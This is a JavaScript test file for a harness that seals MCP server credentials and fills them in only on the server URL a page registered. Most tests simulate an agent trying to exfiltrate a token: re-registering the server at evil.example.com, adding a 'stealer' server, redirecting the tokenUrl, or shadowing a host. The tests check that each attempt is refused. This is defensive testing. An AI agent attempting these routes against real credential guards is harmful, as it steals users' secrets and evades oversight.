import assert from 'node:assert/strict';
import { test } from 'node:test';
import { setup } from './setup.mjs';

const { embedder } = await setup();

const DOCS = 'fake-docs-mcp-0401';
const OWNER = { pid: 9, ppid: 1, uid: 1000, gid: 1000, tag: 'cone', users: 'enforce' };

async function ready(t) {
  const page = await embedder(t);
  await page.evaluate(() => window.harness.connect());
  const docs = await page.evaluate(
    (value) => window.harness.call('put', { name: 'DOCS_MCP', value, kind: 'mcp', server: 'docs' }),
    DOCS
  );
  const set = await page.evaluate(() =>
    window.harness.call('endpoints', {
      mcp: [
        { server: 'docs', url: 'https://docs.example.com/mcp', names: ['DOCS_MCP'] },
        { server: 'kern', url: 'http://8081.kernel.localhost/mcp' },
      ],
    })
  );
  assert.equal(set.ok, true);
  await page.evaluate(() => window.harness.agent());
  const ask = (op, fields) => page.evaluate((o, f) => window.harness.ask(o, f), op, fields);
  return { page, ask, docs };
}

const call = (url, placeholder) => ({
  method: 'POST',
  url,
  headers: [['authorization', `Bearer ${placeholder}`]],
  body: '{}',
});

test('a page-sealed MCP credential is filled on the server URL the page registered for its name', async (t) => {
  const { ask, docs } = await ready(t);
  const got = await ask('mcp', {
    server: 'docs',
    request: call('https://docs.example.com/mcp/tools', docs.placeholder),
  });
  assert.deepEqual(got.request.headers, [['authorization', `Bearer ${DOCS}`]]);
});

test('NEGATIVE an agent re-registering a bound server name at evil.example never gets the credential', async (t) => {
  const { ask, docs } = await ready(t);
  const registered = await ask('endpoints', {
    mcp: [{ server: 'docs', url: 'https://evil.example.com/mcp', names: ['DOCS_MCP'] }],
  });
  assert.equal(registered.ok, true);
  const sent = await ask('mcp', {
    server: 'docs',
    request: call('https://evil.example.com/mcp', docs.placeholder),
  });
  assert.equal(sent.error.code, 'EACCES');
  assert.match(sent.error.message, /DOCS_MCP is sent only to docs's own endpoints/);
  assert.ok(!JSON.stringify(sent).includes(DOCS));
  const own = await ask('mcp', {
    server: 'docs',
    request: call('https://docs.example.com/mcp', docs.placeholder),
  });
  assert.deepEqual(own.request.headers, [['authorization', `Bearer ${DOCS}`]]);
});

test('NEGATIVE an agent registering a new server name that lists a page-sealed credential never gets it', async (t) => {
  const { ask, docs } = await ready(t);
  await ask('endpoints', {
    mcp: [{ server: 'stealer', url: 'https://evil.example.com/mcp', names: ['DOCS_MCP'] }],
  });
  const sent = await ask('mcp', {
    server: 'stealer',
    request: call('https://evil.example.com/mcp', docs.placeholder),
  });
  assert.match(sent.error.message, /DOCS_MCP isn't a credential of stealer/);
  assert.ok(!JSON.stringify(sent).includes(DOCS));
});

test('NEGATIVE an MCP credential is never filled on a model endpoint or, unless it is a bridge token, on a kernel loopback', async (t) => {
  const { page, ask } = await ready(t);
  await ask('endpoints', {
    mcp: [
      {
        server: 'llm',
        url: 'https://api.openai.com/v1/mcp',
        tokenUrl: 'https://auth.example.com/token',
      },
    ],
  });
  const granted = await ask('grant', {
    server: 'llm',
    oauth: { tokenUrl: 'https://auth.example.com/token', clientId: 'fake-client' },
    response: JSON.stringify({ token_type: 'Bearer', access_token: 'fake-llm-access-0402' }),
  });
  const token = JSON.parse(granted.response).access_token;
  const model = await ask('mcp', {
    server: 'llm',
    request: call('https://api.openai.com/v1/mcp', token),
  });
  assert.match(model.error.message, /is sent only to llm's own endpoints/);
  const kern = await page.evaluate(() =>
    window.harness.call('put', {
      name: 'KERN_MCP',
      value: 'fake-kern-mcp-0403',
      kind: 'mcp',
      server: 'kern',
    })
  );
  const loop = await ask('mcp', {
    server: 'kern',
    request: call('http://8081.kernel.localhost/mcp', kern.placeholder),
  });
  assert.match(loop.error.message, /KERN_MCP isn't a credential of kern/);
});

test('NEGATIVE an agent cannot add names or a tokenUrl to a page server', async (t) => {
  const { page, ask } = await ready(t);
  const other = await page.evaluate(() =>
    window.harness.call('put', {
      name: 'OTHER_MCP',
      value: 'fake-other-mcp-0404',
      kind: 'mcp',
      server: 'other',
    })
  );
  await ask('endpoints', {
    mcp: [
      {
        server: 'docs',
        url: 'https://docs.example.com/mcp',
        names: ['OTHER_MCP'],
        tokenUrl: 'https://evil.example.com/token',
      },
    ],
  });
  const sent = await ask('mcp', {
    server: 'docs',
    request: call('https://docs.example.com/mcp', other.placeholder),
  });
  assert.match(sent.error.message, /OTHER_MCP isn't a credential of docs/);
  const forwarded = await page.evaluate((f) => window.harness.forward(f), {
    head: {
      method: 'POST',
      url: 'https://docs.example.com/mcp/call',
      headers: [['Authorization', `Bearer ${other.placeholder}`]],
    },
    body: '{}',
    owner: OWNER,
    exit: 'page',
    rawTraits: {},
  });
  assert.match(
    forwarded.reply.refused.reason,
    /OTHER_MCP isn't a credential of the MCP server docs/
  );
  const granted = await ask('grant', {
    server: 'docs',
    oauth: { tokenUrl: 'https://evil.example.com/token', clientId: 'fake-client' },
    response: JSON.stringify({ token_type: 'Bearer', access_token: 'fake-docs-access-0405' }),
  });
  assert.match(granted.error.message, /isn't the registered tokenUrl of docs/);
});

test('NEGATIVE an agent server on the same host never shadows a page server for a kernel forward', async (t) => {
  const { page, ask, docs } = await ready(t);
  await ask('endpoints', {
    mcp: [{ server: 'shadow', url: 'https://docs.example.com', names: [] }],
  });
  const sent = await page.evaluate((f) => window.harness.forward(f), {
    head: {
      method: 'POST',
      url: 'https://docs.example.com/mcp/call',
      headers: [['Authorization', `Bearer ${docs.placeholder}`]],
    },
    body: '{}',
    owner: OWNER,
    exit: 'page',
    rawTraits: {},
  });
  assert.deepEqual(sent.reply.head.headers, [['Authorization', `Bearer ${DOCS}`]]);
  const audit = (await page.evaluate(() => window.harness.call('audit', { limit: 1 }))).audit[0];
  assert.deepEqual([audit.type, audit.server, audit.name], ['mcp', 'docs', 'DOCS_MCP']);
});
